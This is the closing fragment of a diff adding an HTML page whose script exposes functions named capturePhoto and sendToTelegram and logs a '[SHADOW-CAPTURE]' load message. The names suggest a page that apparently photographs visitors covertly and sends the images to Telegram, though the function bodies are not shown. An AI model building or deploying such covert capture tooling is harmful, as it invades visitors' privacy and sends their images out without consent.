+            State,
+            capturePhoto,
+            sendToTelegram,
+            toggleControlPanel: () => {
+                State.controlPanelVisible = !State.controlPanelVisible;
+                document.getElementById('controlPanel').style.display = 
+                    State.controlPanelVisible ? 'block' : 'none';
+            }
+        };
+        
+        console.log('[SHADOW-CAPTURE] Loaded successfully. Access debug with _shadowCapture');
+        
+    </script>
+</body>
+</html>
